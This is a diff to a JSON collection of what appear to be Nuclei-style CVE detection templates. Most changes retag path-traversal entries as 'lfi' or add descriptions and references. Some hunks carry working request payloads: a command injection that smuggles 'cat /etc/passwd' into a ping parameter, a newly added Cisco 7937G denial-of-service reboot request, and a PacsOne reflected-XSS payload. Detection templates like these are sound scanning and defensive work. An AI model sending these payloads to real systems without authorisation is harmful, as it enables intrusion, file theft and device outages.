@@ -188,7 +188,7 @@
         "name": "Apache Struts2 S2-008 RCE",
         "reference": "https://blog.csdn.net/weixin_43416469/article/details/113850545",
         "severity": "critical",
-        "tags": "cve, cve2012,apache,rce,struts"
+        "tags": "cve,cve2012,apache,rce,struts"
       },
       "requests": [
         {
@@ -310,7 +310,7 @@
         "name": "ElasticSearch v1.1.1/1.2 RCE",
         "reference": "https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120",
         "severity": "critical",
-        "tags": "cve,cve2014,elasticsearch,rce"
+        "tags": "cve,cve2014,elastic,rce"
       },
       "requests": [
         {
@@ -395,7 +395,7 @@
         "name": "ElasticSearch 1.4.0/1.4.2 RCE",
         "reference": "https://blog.csdn.net/JiangBuLiu/article/details/94457980",
         "severity": "critical",
-        "tags": "cve,cve2015,elasticsearch,rce"
+        "tags": "cve,cve2015,elastic,rce"
       },
       "requests": [
         {
@@ -441,7 +441,7 @@
       "requests": [
         {
           "headers": {
-            "Referer": "\u0000"
+            "Referer": "\\x00"
           },
           "matchers": [
             {
@@ -586,7 +586,7 @@
         "name": "Trend Micro Threat Discovery Appliance Auth Bypass via Directory Traversal",
         "reference": "https://gist.github.com/malerisch/5de8b408443ee9253b3954a62a8d97b4",
         "severity": "critical",
-        "tags": "cve,cve2016"
+        "tags": "cve,cve2016,lfi"
       },
       "requests": [
         {
@@ -874,8 +874,9 @@
         "author": "apt-mirror",
         "description": "Directory traversal vulnerability in scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS in SAP NetWeaver Application Server Java 7.5 allows remote attackers to read arbitrary files via a .. (dot dot) in the query string, as exploited in the wild in August 2017, aka SAP Security Note 2486657.",
         "name": "Directory traversal vulnerability in SAP NetWeaver Application Server Java 7.5",
+        "reference": "- https://www.cvedetails.com/cve/CVE-2017-12637/\n- https://nvd.nist.gov/vuln/detail/CVE-2017-12637\n- https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_SAP-Bugs-The-Phantom-Security.pdf\n",
         "severity": "high",
-        "tags": "cve,cve2017,sap,traversal"
+        "tags": "cve,cve2017,sap,lfi"
       },
       "requests": [
         {
@@ -909,8 +910,9 @@
       "info": {
         "author": "pikpikcu",
         "name": "trixbox 2.8.0 - directory-traversal",
+        "reference": "- https://nvd.nist.gov/vuln/detail/CVE-2017-14537\n- https://secur1tyadvisory.wordpress.com/2018/02/13/trixbox-multiple-path-traversal-vulnerabilities-cve-2017-14537/\n- Product vendor:-https://sourceforge.net/projects/asteriskathome/\n",
         "severity": "medium",
-        "tags": "cve,cve2017,trixbox,traversal"
+        "tags": "cve,cve2017,trixbox,lfi"
       },
       "requests": [
         {
@@ -944,7 +946,7 @@
         "description": "Node.js 8.5.0 before 8.6.0 allows remote attackers to access unintended files, because a change to \"..\" handling was incompatible with the pathname validation used by unspecified community modules.",
         "name": "Node.js 8.5.0 >=< 8.6.0 Directory Traversal",
         "severity": "high",
-        "tags": "cve,cve2017,nodejs,traversal"
+        "tags": "cve,cve2017,nodejs,lfi"
       },
       "requests": [
         {
@@ -1226,7 +1228,7 @@
         "name": "Apache Struts2 S2-053 RCE",
         "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-9791",
         "severity": "critical",
-        "tags": "cve, cve2017,apache,rce"
+        "tags": "cve,cve2017,apache,rce"
       },
       "requests": [
         {
@@ -1354,8 +1356,9 @@
       "info": {
         "author": "organiccrap",
         "name": "Cisco ASA path traversal vulnerability",
+        "reference": "https://github.com/yassineaboukir/CVE-2018-0296",
         "severity": "medium",
-        "tags": "cve,cve2018,cisco,traversal"
+        "tags": "cve,cve2018,cisco,lfi"
       },
       "requests": [
         {
@@ -1533,7 +1536,7 @@
         "name": "Apache Struts2 S2-057 RCE",
         "reference": "https://github.com/jas502n/St2-057",
         "severity": "critical",
-        "tags": "cve,cve2018,apache,rce,struts2"
+        "tags": "cve,cve2018,apache,rce,struts"
       },
       "requests": [
         {
@@ -1662,7 +1665,7 @@
         "name": "Spring MVC Directory Traversal Vulnerability",
         "reference": "https://medium.com/@knownsec404team/analysis-of-spring-mvc-directory-traversal-vulnerability-cve-2018-1271-b291bdb6be0d",
         "severity": "high",
-        "tags": "cve,cve2018,spring,traversal"
+        "tags": "cve,cve2018,spring,lfi"
       },
       "requests": [
         {
@@ -2230,7 +2233,7 @@
         "name": "node-srv Path Traversal",
         "reference": "https://hackerone.com/reports/309124",
         "severity": "high",
-        "tags": "cve,cve2018,nodejs,traversal"
+        "tags": "cve,cve2018,nodejs,lfi"
       },
       "requests": [
         {
@@ -2263,7 +2266,7 @@
         "author": "0xrudra",
         "name": "Rails CVE-2018-3760",
         "severity": "high",
-        "tags": "cve,cve2018,rails,traversal"
+        "tags": "cve,cve2018,rails,lfi"
       },
       "requests": [
         {
@@ -2297,7 +2300,7 @@
         "name": "WordPress Smart Google Code Inserter Authentication Bypass",
         "reference": "https://www.exploit-db.com/exploits/43420",
         "severity": "critical",
-        "tags": "wordpress,auth-bypass,cve,cve2018"
+        "tags": "wordpress,cve,cve2018"
       },
       "requests": [
         {
@@ -2445,7 +2448,7 @@
         "author": "madrobot",
         "name": "uWSGI PHP Plugin Directory Traversal",
         "severity": "high",
-        "tags": "cve,cve2018,uwsgi,php,traversal"
+        "tags": "cve,cve2018,uwsgi,php,lfi"
       },
       "requests": [
         {
@@ -2786,7 +2789,7 @@
         "name": "Pulse Connect Secure SSL VPN arbitrary file read vulnerability",
         "reference": "https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html",
         "severity": "high",
-        "tags": "cve,cve2019,pulsesecure,traversal"
+        "tags": "cve,cve2019,pulsesecure,lfi"
       },
       "requests": [
         {
@@ -3306,7 +3309,7 @@
         "description": "This template supports the detection part only. See references.\n\nadmin/includes/class.import.snippet.php in the \"Woody ad snippets\" plugin\nbefore 2.2.5 for WordPress allows unauthenticated options import,\nas demonstrated by storing an XSS payload for remote code execution.\n\nSource/References:\n- https://github.com/GeneralEG/CVE-2019-15858\n",
         "name": "Unauthenticated Woody Ad Snippets WordPress Plugin RCE",
         "severity": "high",
-        "tags": "cve,cve2019,wordpress,wp-pluing,xss"
+        "tags": "cve,cve2019,wordpress,wp-plugin,xss"
       },
       "requests": [
         {
@@ -3793,7 +3796,7 @@
         "author": "organiccrap",
         "name": "Citrix ADC Directory Traversal",
         "severity": "high",
-        "tags": "cve,cve2019,citrix,traversal"
+        "tags": "cve,cve2019,citrix,lfi"
       },
       "requests": [
         {
@@ -3935,7 +3938,7 @@
         "name": "Oracle Business Intelligence Path Traversal",
         "reference": "http://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html",
         "severity": "high",
-        "tags": "cve,cve2019,oracle,traversal"
+        "tags": "cve,cve2019,oracle,lfi"
       },
       "requests": [
         {
@@ -4013,7 +4016,7 @@
         "name": "Atlassian Confluence Path Traversal",
         "reference": "https://github.com/x-f1v3/CVE-2019-3396",
         "severity": "high",
-        "tags": "cve,cve2019,atlassian,confluence,traversal,rce"
+        "tags": "cve,cve2019,atlassian,confluence,lfi,rce"
       },
       "requests": [
         {
@@ -4123,7 +4126,7 @@
         "author": "madrobot",
         "name": "Spring-Cloud-Config-Server Directory Traversal",
         "severity": "high",
-        "tags": "cve,cve2019,traversal"
+        "tags": "cve,cve2019,lfi"
       },
       "requests": [
         {
@@ -4215,7 +4218,7 @@
         "name": "File Content Disclosure on Rails",
         "reference": "https://github.com/omarkurt/CVE-2019-5418",
         "severity": "medium",
-        "tags": "cve,cve2019,rails,traversal"
+        "tags": "cve,cve2019,rails,lfi"
       },
       "requests": [
         {
@@ -4327,7 +4330,7 @@
         "description": "W3 Total Cache 0.9.2.6-0.9.3 - Unauthenticated Arbitrary File Read / SSRF",
         "name": "CVE-2019-6715",
         "severity": "high",
-        "tags": "cve,cve2019,wordpress,wp-pluing,ssrf"
+        "tags": "cve,cve2019,wordpress,wp-plugin,ssrf"
       },
       "requests": [
         {
@@ -4471,7 +4474,7 @@
         "author": "Kishore Krishna (siLLyDaddy)",
         "name": "JIRA Directory Traversal",
         "severity": "medium",
-        "tags": "cve,cve2019,atlassian,jira,traversal"
+        "tags": "cve,cve2019,atlassian,jira,lfi"
       },
       "requests": [
         {
@@ -4568,7 +4571,7 @@
         "author": "madrobot",
         "name": "Totaljs - Unathenticated Directory Traversal",
         "severity": "high",
-        "tags": "cve,cve2019,totaljs,traversal"
+        "tags": "cve,cve2019,totaljs,lfi"
       },
       "requests": [
         {
@@ -4760,7 +4763,7 @@
         "name": "WordPress social-warfare RFI",
         "reference": "https://github.com/mpgn/CVE-2019-9978",
         "severity": "critical",
-        "tags": "cve,cve2019,wordpress,wp-pluing,ssrf"
+        "tags": "cve,cve2019,wordpress,wp-plugin,ssrf"
       },
       "requests": [
         {
@@ -5121,7 +5124,7 @@
         "description": "The issue is being actively exploited, and allows attackers\nto download arbitrary files, such as the wp-config.php file.\nAccording to the vendor, the vulnerability was only in two\nversions v1.3.24 and v1.3.26, the vulnerability wasn't\npresent in versions 1.3.22 and before.\n\nReferences:\n- https://www.tenable.com/blog/duplicator-wordpress-plugin-vulnerability-exploited-in-the-wild\n",
         "name": "WordPress Duplicator plugin Directory Traversal",
         "severity": "high",
-        "tags": "cve,cve2020,wordpress,wp-plugin,traversal"
+        "tags": "cve,cve2020,wordpress,wp-plugin,lfi"
       },
       "requests": [
         {
@@ -5280,7 +5283,7 @@
         "name": "Unauthenticated Zoho ManageEngine OpManger Arbitrary File Read",
         "reference": "https://github.com/BeetleChunks/CVE-2020-12116",
         "severity": "high",
-        "tags": "cve,cve2020,zoho,traversal"
+        "tags": "cve,cve2020,zoho,lfi"
       },
       "requests": [
         {
@@ -5564,6 +5567,7 @@
       "id": "CVE-2020-14092",
       "info": {
         "author": "princechaddha",
+        "description": "WordPress Payment Form For Paypal Pro 'query' parameter allows for any unauthenticated user to perform SQL queries with result output to a web page in JSON format.",
         "name": "WordPress Payment Form For Paypal Pro Unauthenticated SQL Injection",
         "reference": "https://wpscan.com/vulnerability/10287",
         "severity": "critical",
@@ -5647,7 +5651,7 @@
         "author": "bjhulst",
         "description": "Affected versions of Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate users via an Information Disclosure vulnerability in the /ViewUserHover.jspa endpoint. The affected versions are before version 7.13.6, from version 8.0.0 before 8.5.7, and from version 8.6.0 before 8.12.0.",
         "name": "User enumeration via insecure Jira endpoint",
-        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14181",
+        "reference": "- https://jira.atlassian.com/browse/JRASERVER-71560\n- http://packetstormsecurity.com/files/161730/Atlassian-JIRA-8.11.1-User-Enumeration.html\n",
         "severity": "medium",
         "tags": "cve,cve2020,atlassian,jira"
       },
@@ -5726,7 +5730,7 @@
         "name": "Oracle Fusion - \"getPreviewImage\" Directory Traversal/Local File Inclusion",
         "reference": "- http://packetstormsecurity.com/files/159748/Oracle-Business-Intelligence-Enterprise-Edition-5.5.0.0.0-12.2.1.3.0-12.2.1.4.0-LFI.html\n- https://www.oracle.com/security-alerts/cpuoct2020.html\n",
         "severity": "high",
-        "tags": "cve,cve2020,oracle,traversal"
+        "tags": "cve,cve2020,oracle,lfi"
       },
       "requests": [
         {
@@ -5935,6 +5939,45 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}/PDC/ajaxreq.php?PARAM=127.0.0.1+-c+0%3B+cat+%2Fetc%2Fpasswd&DIAGNOSIS=PING"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-16139",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Cisco 7937G Denial-of-Service Reboot Attack",
+        "reference": "https://blacklanternsecurity.com/2020-08-07-Cisco-Unified-IP-Conference-Station-7937G/",
+        "severity": "low",
+        "tags": "cve,cve2020,dos,cisco"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/xml"
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /localmenus.cgi?func=609&rphl=1&data=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\n"
           ]
         }
       ]
@@ -6166,7 +6209,7 @@
         "name": "Apache Flink Upload Path Traversal",
         "reference": "https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518",
         "severity": "critical",
-        "tags": "cve,cve2020,apache,traversal"
+        "tags": "cve,cve2020,apache,lfi"
       },
       "requests": [
         {
@@ -6198,7 +6241,7 @@
         "name": "Apache Flink directory traversal",
         "reference": "https://github.com/B1anda0/CVE-2020-17519",
         "severity": "high",
-        "tags": "cve,cve2020,apache,traversal"
+        "tags": "cve,cve2020,apache,lfi"
       },
       "requests": [
         {
@@ -6622,8 +6665,9 @@
       "id": "CVE-2020-24312",
       "info": {
         "author": "x1m_martijn",
+        "description": "mndpsingh287 WP File Manager v6.4 and lower fails to restrict external access to the fm_backups directory with a .htaccess file. This results in the ability for unauthenticated users to browse and download any site backups, which sometimes include full database backups, that the plugin has taken.\n",
         "name": "WordPress Plugin File Manager (wp-file-manager) Backup Disclosure",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-24312",
+        "reference": "https://zeroaptitude.com/zerodetail/wordpress-plugin-bug-hunting-part-1/",
         "severity": "high",
         "tags": "cve,cve2020,wordpress,backups"
       },
@@ -6808,7 +6852,7 @@
         "name": "ThinkAdmin 6 - Arbitrarily File Read (CVE-2020-25540)",
         "reference": "https://www.exploit-db.com/exploits/48812",
         "severity": "medium",
-        "tags": "cve,cve2020,thinkadmin,traversal"
+        "tags": "cve,cve2020,thinkadmin,lfi"
       },
       "requests": [
         {
@@ -7013,7 +7057,7 @@
         "author": "pikpikcu",
         "description": "SonarQube 8.4.2.36762 allows remote attackers to discover cleartext SMTP,\nSVN, and GitLab credentials via the api/settings/values URI.\nNOTE: reportedly, the vendor's position for SMTP and SVN is \"it is the administrator's responsibility to configure it.\"\n",
         "name": "SonarQube unauth",
-        "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-27986",
+        "references": "https://csl.com.co/sonarqube-auditando-al-auditor-parte-i/",
         "severity": "medium",
         "tags": "cve,cve2020,sonarqube"
       },
@@ -7042,6 +7086,42 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/api/settings/values"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-29164",
+      "info": {
+        "author": "geeknik",
+        "description": "PacsOne Server (PACS Server In One Box) below 7.1.1 is affected by cross-site scripting (XSS).",
+        "name": "PacsOne Server XSS",
+        "reference": "https://gist.github.com/leommxj/0a32afeeaac960682c5b7c9ca8ed070d",
+        "severity": "medium",
+        "tags": "pacsone,xss,cve,cve2020"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<img src=\"\" onerror=\"alert(1);\">1</img>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Pacs/login.php?message=%3Cimg%20src=%22%22%20onerror=%22alert(1);%22%3E1%3C/img%3E"
           ]
         }
       ]
@@ -7101,7 +7181,7 @@
           "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86"
         ],
         "severity": "medium",
-        "tags": "cve,cve2020,cisco,traversal"
+        "tags": "cve,cve2020,cisco,lfi"
       },
       "requests": [
         {
@@ -7200,6 +7280,7 @@
       "id": "CVE-2020-35951",
       "info": {
         "author": "princechaddha",
+        "description": "An issue was discovered in the Quiz and Survey Master plugin before 7.0.1 for WordPress. It allows users to delete arbitrary files such as wp-config.php file, which could effectively take a site offline and allow an attacker to reinstall with a WordPress instance under their control. This occurred via qsm_remove_file_fd_question, which allowed unauthenticated deletions (even though it was only intended for a person to delete their own quiz-answer files).\n",
         "name": "Wordpress Quiz and Survey Master Arbitrary File Deletion",
         "reference": "https://www.wordfence.com/blog/2020/08/critical-vulnerabilities-patched-in-quiz-and-survey-master-plugin/",
         "severity": "critical",
@@ -7292,7 +7373,7 @@
         "author": "Harsh & Rahul & dwisiswant0",
         "name": "Next.js .next/ limited path traversal",
         "severity": "medium",
-        "tags": "cve,cve2020,nextjs,traversal"
+        "tags": "cve,cve2020,nextjs,lfi"
       },
       "requests": [
         {
@@ -7330,10 +7411,11 @@
       "id": "CVE-2020-5405",
       "info": {
         "author": "Harsh Bothra",
+        "description": "Spring Cloud Config, versions 2.2.x prior to 2.2.2, versions 2.1.x prior to 2.1.7, and older unsupported versions allow applications to serve arbitrary configuration files through the spring-cloud-config-server module. A malicious user, or attacker, can send a request using a specially crafted URL that can lead a directory traversal attack.",
         "name": "Spring Cloud Directory Traversal",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-5405",
+        "reference": "https://pivotal.io/security/cve-2020-5405",
         "severity": "high",
-        "tags": "cve,cve2020,traversal,springcloud"
+        "tags": "cve,cve2020,lfi,springcloud"
       },
       "requests": [
         {
@@ -7366,7 +7448,7 @@
         "author": "mavericknerd",
         "name": "Directory Traversal in Spring Cloud Config Server",
         "severity": "high",
-        "tags": "cve,cve2020,traversal,springcloud"
+        "tags": "cve,cve2020,lfi,springcloud"
       },
       "requests": [
         {
@@ -7508,6 +7590,7 @@
       "id": "CVE-2020-5847",
       "info": {
         "author": "madrobot",
+        "description": "A vulnerability in UnRaid allows remote unauthenticated attackers to execute arbirary code.",
         "name": "UnRaid Remote Code Execution",
         "reference": "https://sysdream.com/news/lab/2020-02-06-cve-2020-5847-cve-2020-5849-unraid-6-8-0-unauthenticated-remote-code-execution-as-root/",
         "severity": "high",
@@ -7647,7 +7730,9 @@
       "id": "CVE-2020-7209",
       "info": {
         "author": "dwisiswant0",
+        "description": "LinuxKI v6.0-1 and earlier is vulnerable to an remote code execution which is resolved in release 6.0-2.",
         "name": "LinuxKI Toolset 6.01 Remote Command Execution",
+        "reference": "http://packetstormsecurity.com/files/157739/HP-LinuxKI-6.01-Remote-Command-Injection.html http://packetstormsecurity.com/files/158025/LinuxKI-Toolset-6.01-Remote-Command-Execution.html https://github.com/HewlettPackard/LinuxKI/releases/tag/v6.0-2",
         "severity": "critical",
         "tags": "cve,cve2020,rce"
       },
@@ -7716,7 +7801,9 @@
       "id": "CVE-2020-7961",
       "info": {
         "author": "dwisiswant0",
+        "description": "Deserialization of Untrusted Data in Liferay Portal prior to 7.2.1 CE GA2 allows remote attackers to execute arbitrary code via JSON web services (JSONWS).",
         "name": "Liferay Portal Unauthenticated RCE",
+        "reference": "- https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html\n- https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/117954271\n",
         "severity": "critical",
         "tags": "cve,cve2020,rce,liferay"
       },
@@ -7770,7 +7857,12 @@
       "id": "CVE-2020-8091",
       "info": {
         "author": "dwisiswant0",
+        "description": "svg.swf in TYPO3 6.2.0 to 6.2.38 ELTS and 7.0.0 to 7.1.0 could allow an unauthenticated, remote attacker to conduct a cross-site scripting (XSS) attack on a targeted system. This may be at a contrib/websvg/svg.swf pathname.",
         "name": "TYPO3 Cross-Site Scripting Vulnerability",
+        "reference": [
+          "https://typo3.org/security/advisory/typo3-psa-2019-003/",
+          "https://www.purplemet.com/blog/typo3-xss-vulnerability"
+        ],
         "severity": "medium",
         "tags": "cve,cve2020,xss"
       },
@@ -7919,7 +8011,7 @@
           "http://packetstormsecurity.com/files/160047/Citrix-ADC-NetScaler-Local-File-Inclusion.html"
         ],
         "severity": "high",
-        "tags": "cve,cve2020,citrix,traversal"
+        "tags": "cve,cve2020,citrix,lfi"
       },
       "requests": [
         {
@@ -8005,7 +8097,7 @@
         "description": "Improper access control in Citrix XenMobile Server 10.12 before RP2,\nCitrix XenMobile Server 10.11 before RP4, Citrix XenMobile Server 10.10\nbefore RP6 and Citrix XenMobile Server before 10.9 RP5 and leads to the ability to read arbitrary files.\n\nReferences:\n- https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/\n",
         "name": "Citrix XenMobile Server Path Traversal",
         "severity": "high",
-        "tags": "cve,cve2020,citrix,traversal"
+        "tags": "cve,cve2020,citrix,lfi"
       },
       "requests": [
         {
@@ -8119,7 +8211,7 @@
         "name": "Citrix ShareFile StorageZones Unauthenticated Arbitrary File Read",
         "reference": "https://support.citrix.com/article/CTX269106",
         "severity": "high",
-        "tags": "cve,cve2020,citrix,traversal"
+        "tags": "cve,cve2020,citrix,lfi"
       },
       "requests": [
         {
@@ -8470,7 +8562,7 @@
         "name": "Cisco SD-WAN vManage Software Directory Traversal",
         "reference": "https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-vman-traversal-hQh24tmk.html",
         "severity": "high",
-        "tags": "Directory Traversal"
+        "tags": "lfi,cve,cve2020,cisco"
       },
       "requests": [
         {
@@ -8662,7 +8754,7 @@
         "name": "Revive Adserver < 5.1.0 Open Redirect",
         "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-22873",
         "severity": "low",
-        "tags": "cve,cve2021,rediect"
+        "tags": "cve,cve2021,redirect"
       },
       "requests": [
         {
@@ -8785,7 +8877,7 @@
         "name": "Redwood v4.3.4.5-v4.5.3 XSS",
         "reference": "https://vict0ni.me/report2web-xss-frame-injection.html",
         "severity": "medium",
-        "tags": "cve,cve2021,Redwood,xss"
+        "tags": "cve,cve2021,redwood,xss"
       },
       "requests": [
         {
@@ -9024,7 +9116,7 @@
         "name": "Lanproxy Directory Traversal",
         "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3019",
         "severity": "medium",
-        "tags": "cve,cve2021,lanproxy,traversal"
+        "tags": "cve,cve2021,lanproxy,lfi"
       },
       "requests": [
         {
